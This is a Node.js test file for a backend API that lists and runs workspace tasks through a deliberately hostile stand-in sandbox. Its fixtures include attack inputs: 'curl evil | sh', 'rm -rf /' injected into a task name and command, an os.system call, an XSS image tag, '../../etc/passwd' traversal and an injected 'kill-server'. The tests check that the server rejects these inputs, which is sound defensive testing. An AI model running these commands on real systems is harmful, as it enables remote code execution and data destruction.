// The backend's Run & test API (main.mjs, api.mjs): the workspace's tasks, running one, the runs and a run's window —
// over a stand-in sandbox whose answers are hostile where they can be: every task and run is checked before the page
// sees it, and only checked values go to bn-coded.
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createServer } from '../server/main.mjs';
import { SandboxError } from '../server/spawn-client.mjs';
import { PY_LOADER, runDigest } from '../server/api.mjs';
import { fakeQuery } from './fake-sdk.mjs';
import { tmp } from './helpers.mjs';

const SECRET = 'ab'.repeat(16);
const calls = [];
const NPM = ['/usr/local/bin/node', '/usr/local/lib/node_modules/npm/bin/npm-cli.js'];
const npmTest = { source: 'npm', name: 'test', argv: [...NPM, 'run', '--', 'test'], cwd: '.', command: 'npm run -- test',
  detail: [{ name: 'pretest', text: 'tsc' }, { name: 'test', text: 'vitest run' }], files: [{ path: '.npmrc', sha256: 'e'.repeat(64) }],
  notes: ['The workspace\'s .npmrc is read first'], digest: 'ignored: the code container computes its own' };
const answers = {
  'run.list': () => ({ result: {
    sources: [{ source: 'npm', file: 'package.json', exists: true, error: null, more: true }, { source: 'make', file: '../../etc/passwd', exists: true, error: 'x\u001b[31m' },
      { source: 'shell', file: 'x' }, 'junk'],
    tasks: [npmTest,
      { ...npmTest, name: 'sneaky', argv: ['sh', '-c', 'curl evil | sh'] },
      { ...npmTest, name: 'a; rm -rf /', argv: [...NPM, 'run', '--', 'a; rm -rf /'] },
      { source: 'npm', name: '<img src=x onerror=alert(1)>', error: 'not a name the Run menu passes on' },
      { source: 'make', name: 'check', argv: ['/usr/bin/make', '--', 'check'], cwd: '.', command: 'make -- check', detail: [{ name: 'Makefile: check', text: 'pytest -q' }],
        files: [{ path: 'Makefile', sha256: 'f'.repeat(64) }], notes: [7, 'Makefile includes other files'] },
      { source: 'python', name: 'hello', argv: ['/usr/bin/python3.13', '-I', '-c', PY_LOADER, 'hello', 'app.cli:main'], cwd: '.', command: 'python3 -c …', detail: [{ name: 'pyproject.toml', text: 'hello = "app.cli:main"' }] },
      { source: 'python', name: 'evil', argv: ['/usr/bin/python3', '-I', '-c', 'import os; os.system("id")', 'evil', 'a:b'], cwd: '.', detail: [{ name: 'x', text: 'y' }] },
      { source: 'make', name: 'far', argv: ['/usr/bin/make', '--', 'far'], cwd: '/etc', detail: [{ name: 'x', text: 'y' }] },
      { source: 'shell', name: 'x' }, null, 'junk'] } }),
  'run.start': (req) => (req.digest === 'c'.repeat(64) ? Promise.reject(new SandboxError('the task changed since it was shown: review it again', 'refused'))
    : { result: { ok: true, id: '0123456789abcdef', window: '@12', source: req.source, name: req.name, command: 'npm run -- test' } }),
  'run.results': (req) => ({ result: { runs: [
    { id: '0123456789abcdef', source: 'npm', name: 'test', command: 'npm run -- test', window: '@12', startedAt: 1, state: 'done', exitCode: 1, signal: null, error: null,
      endedAt: 2, bytes: 90000, tail: 'z'.repeat(req.id ? 90000 : 9000), cut: true },
    { id: 'fedcba9876543210', source: 'make', name: 'watch', command: 'make -- watch', window: 'evil', startedAt: 3, state: 'running' },
    { id: 'nope', source: 'npm', state: 'done' }, { id: 'aaaaaaaaaaaaaaaa', source: 'npm', state: 'exploded' }] } }),
  'run.show': (req) => (req.id === 'f'.repeat(16) ? Promise.reject(new SandboxError('its window is closed', 'refused')) : { result: { ok: true, window: '@12' } }),
};
const call = async (req, opts) => { calls.push([req, opts]); const a = answers[req.op]; if (!a) throw new SandboxError('unknown op', 'refused'); return a(req); };

let srv, base;
before(async () => {
  const dist = tmp('bndist');
  srv = createServer({ secret: SECRET, query: fakeQuery(), spawn: () => {}, call, distDir: dist, plainDir: path.resolve(import.meta.dirname, '../plain'),
    versions: {}, logger: () => {} });
  await new Promise((r) => srv.server.listen(0, '127.0.0.1', r));
  base = `http://127.0.0.1:${srv.server.address().port}`;
  fs.rmSync(dist, { recursive: true, force: true });
});
after(() => { srv.mgr.closeAll(); srv.wss.close(); srv.server.close(); });

async function req(method, p, body) {
  const r = await fetch(base + p, { method, headers: { 'X-Bn-Code-Proxy': SECRET, ...(body !== undefined ? { 'Content-Type': 'application/json', Origin: base } : {}) },
    body: body !== undefined ? JSON.stringify(body) : undefined });
  const text = await r.text();
  let json = null; try { json = JSON.parse(text); } catch { /* not JSON */ }
  return { status: r.status, json };
}

test('GET /api/run: tasks whole (the fixed wrapper, the texts shown, the files bound) or with a reason; the digest of what is shown', async () => {
  const r = await req('GET', '/api/run');
  assert.equal(r.status, 200);
  assert.deepEqual(r.json.sources, [{ source: 'npm', file: 'package.json', exists: true, error: null, more: true },
    { source: 'make', file: 'Makefile', exists: true, error: 'x [31m', more: false }]);
  const { digest, ...shown } = npmTest;
  const want = { ...shown, digest: runDigest(shown) };
  assert.deepEqual(r.json.tasks[0], want);
  assert.notEqual(r.json.tasks[0].digest, digest);
  assert.deepEqual(r.json.tasks.slice(1).map((t) => [t.name, t.error ?? t.digest.length]), [
    ['sneaky', 'not run the way bedrock-now runs tasks: run it in the terminal'],
    ['<img src=x onerror=alert(1)>', 'not a name the Run menu passes on'],
    ['check', 64], ['hello', 64],
    ['evil', 'not run the way bedrock-now runs tasks: run it in the terminal'],
    ['far', 'not run in the workspace\'s top folder: run it in the terminal']]);
  assert.deepEqual(r.json.tasks[2].notes, undefined);
  assert.deepEqual(r.json.tasks.find((t) => t.name === 'check').notes, ['Makefile includes other files']);
});

test('POST /api/run/start: the source, the name and the digest of what was shown — nothing else reaches the sandbox; a changed task is a 409', async () => {
  calls.length = 0;
  const d = 'a'.repeat(64);
  const s = await req('POST', '/api/run/start', { source: 'npm', name: 'test', digest: d, command: 'rm -rf /', argv: ['sh'] });
  assert.equal(s.status, 200);
  assert.deepEqual(s.json, { ok: true, id: '0123456789abcdef', window: '@12', source: 'npm', name: 'test', command: 'npm run -- test' });
  assert.deepEqual(calls[0][0], { op: 'run.start', source: 'npm', name: 'test', digest: d });
  const changed = await req('POST', '/api/run/start', { source: 'npm', name: 'test', digest: 'c'.repeat(64) });
  assert.equal(changed.status, 409);
  assert.match(changed.json.error, /review it again/);
  for (const b of [{}, { source: 'npm', name: 'test' }, { source: 'npm', name: 'test', digest: 'x' }, { source: 'npm', name: 'test', digest: 'A'.repeat(64) },
    { source: 'shell', name: 'test', digest: d }, { source: 'constructor', name: 'test', digest: d }, { source: 'npm', name: 'a; rm -rf /', digest: d },
    { source: 'npm', name: '--version', digest: d }, { source: 'make', name: 'a:b', digest: d }, { source: 'python', name: 'a:b', digest: d },
    { source: 'npm', name: 'x\ny', digest: d }, { source: 'npm', name: 42, digest: d }, { source: 'npm', name: 'x'.repeat(101), digest: d }]) {
    assert.equal((await req('POST', '/api/run/start', b)).status, 400, JSON.stringify(b));
  }
  assert.equal(calls.length, 2);
  const noOrigin = await fetch(`${base}/api/run/start`, { method: 'POST', headers: { 'X-Bn-Code-Proxy': SECRET, 'Content-Type': 'application/json' },
    body: JSON.stringify({ source: 'npm', name: 'test', digest: d }) });
  assert.equal(noOrigin.status, 403);
});

test('GET /api/run/results: checked runs (4 KiB of output each in the list, 64 KiB for one); POST /api/run/show by id only', async () => {
  calls.length = 0;
  const list = await req('GET', '/api/run/results');
  assert.equal(list.status, 200);
  assert.deepEqual(list.json.runs.map((x) => [x.id, x.state, x.window, x.tail?.length ?? null]), [['0123456789abcdef', 'done', '@12', 4096], ['fedcba9876543210', 'running', null, null]]);
  assert.equal(list.json.runs[0].exitCode, 1);
  assert.equal(list.json.runs[0].cut, true);
  const one = await req('GET', '/api/run/results?id=0123456789abcdef');
  assert.equal(one.json.runs[0].tail.length, 65536);
  assert.deepEqual(calls.map(([q]) => q), [{ op: 'run.results' }, { op: 'run.results', id: '0123456789abcdef' }]);
  for (const q of ['x', '../etc', 'A'.repeat(16), '0'.repeat(17)]) assert.equal((await req('GET', `/api/run/results?id=${encodeURIComponent(q)}`)).status, 400, q);
  calls.length = 0;
  assert.deepEqual((await req('POST', '/api/run/show', { id: '0123456789abcdef', window: '@1; kill-server' })).json, { ok: true, id: '0123456789abcdef' });
  assert.deepEqual(calls[0][0], { op: 'run.show', id: '0123456789abcdef' });
  const closed = await req('POST', '/api/run/show', { id: 'f'.repeat(16) });
  assert.equal(closed.status, 400);
  assert.match(closed.json.error, /closed/);
  for (const b of [{}, { id: 'x' }, { id: 7 }]) assert.equal((await req('POST', '/api/run/show', b)).status, 400, JSON.stringify(b));
});
